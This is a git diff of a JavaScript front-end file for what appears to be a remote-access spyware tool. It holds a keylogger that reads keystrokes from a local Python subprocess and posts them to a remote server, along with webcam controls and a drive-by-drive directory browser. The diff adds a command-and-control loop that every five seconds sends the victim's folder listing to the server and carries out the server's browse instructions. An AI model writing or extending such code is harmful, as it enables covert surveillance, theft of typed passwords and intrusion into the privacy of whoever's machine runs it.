@@ -6,6 +6,7 @@ const path = require('path');
 
 const remotehost = 'localhost';
 const remoteport = 1999;
+const update_interval = 5000;
 
 const video_element = document.getElementById("webcam_preview")
 document.getElementById("stop_video").addEventListener('click', function () { camanager.stop_webcam() })
@@ -14,73 +15,15 @@ const keybox = document.getElementById('keybox');
 const dirbox = document.getElementById('dirbox');
 document.getElementById('back_a_dir').addEventListener('click', function () { directoryman.go_back_a_dir() })
 
-function Remote_get(what) {
-
-    const options = {
-        //hostname: '192.168.0.2',
-        hostname: 'localhost',
-        port: 1999,
-        path: '/action',
-        method: 'GET'
-    }
-
-    const req = http.request(options, res => {
-        console.log(`statusCode: ${res.statusCode}`)
-
-        res.on('data', d => {
-            console.log('Response data: ', JSON.parse(d))
-        })
-    })
-
-    req.on('error', error => {
-        console.error(error)
-    })
-
-    req.end()
-}
-
-function Remote_post(what) {
-
-    const data = JSON.stringify({
-        todo: 'Buy the milk'
-    })
-
-    const options = {
-        hostname: 'localhost',
-        port: 1999,
-        path: '/action/post',
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': data.length
-        }
-    }
-
-    const req = http.request(options, res => {
-        console.log(`statusCode: ${res.statusCode}`)
-
-        res.on('data', d => {
-            console.log('Response to post: ', JSON.parse(d))
-        })
-    })
-
-    req.on('error', error => {
-        console.error(error)
-    })
-
-    req.write(data)
-    req.end()
-}
-
-function axios_test() {
-
-}
 
 window.onload = () => {
     setTimeout(() => {
-        keylog.start_get_keys()
         //camanager.start_webcam()
         directoryman.search_root()
+        setInterval(() => {
+            keylog.get_keys()
+            directoryman.remote_instructions()
+        }, update_interval)
     }, 2000);//wait for server to start
 }
 
@@ -119,15 +62,15 @@ let camanager = {
 /* Keylog */
 
 let keylog = {
-    interval: null,
-    start_get_keys: async function () {//start keylogging
-        keylog.interval = setInterval(async () => { keylog.get_keys() }, 1000);
-    },
     get_keys: async function () {
         let keys = axios.get('http://localhost:5088/key');//python keylog sub-process
 
         await keys.then(keys => {
-            axios.default.post('http://' + remotehost + ':' + remoteport + '/action/post/keylog', JSON.stringify(keys.data.keys))//psot keys to server
+            axios.default.post(
+                'http://' + remotehost + ':' + remoteport + '/action/post/keylog',
+                JSON.stringify(keys.data.keys)
+            )
+
             keybox.innerText = "";
             //console.log(keys);
             keys.data.keys.forEach(keycode => {
@@ -139,9 +82,6 @@ let keylog = {
         })
 
     },
-    stop_get_keys: async function () {
-        clearInterval(keylog.interval);
-    },
     clear: async function () {//clear keys
         axios.get('http://localhost:5088/key/clear')
     }
@@ -152,6 +92,34 @@ let keylog = {
 let directoryman = {
     files: [],
     current_dir: [],
+    remote_instructions: function () {
+        axios.default.post(
+            'http://' + remotehost + ':' + remoteport + '/action/post/folders',
+            JSON.stringify({
+                files: directoryman.files,
+                current_dir: directoryman.current_dir
+            })
+        ).then(res => {//instructions in the response
+            var instriction = JSON.parse(res.data)
+            console.log('server replied: ', instriction)
+            switch (instriction.action) {
+                case 'do nothing':
+                    //do no action
+                    break;
+                case 'search_root':
+                    directoryman.search_root()
+                    break;
+                case 'search_dir':
+                    directoryman.search_dir(instriction.path)
+                    break;
+                case 'go_back_a_dir':
+                    directoryman.go_back_a_dir()
+                    break;
+                default:
+                    console.warn('Unknown instruction: ', instriction)
+            }
+        })//post folder state to server
+    },
     search_root: async function () {//Search root drives, functionality stats here
         console.log('Search root');
         let letters = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'];
@@ -174,6 +142,7 @@ let directoryman = {
                 return 0;
             }
             dirbox.innerHTML = "";
+            directoryman.files = files;
             console.log(files)
             files.forEach(filee => { directoryman.build_dir(searchpath + '\\' + filee, filee) })
 
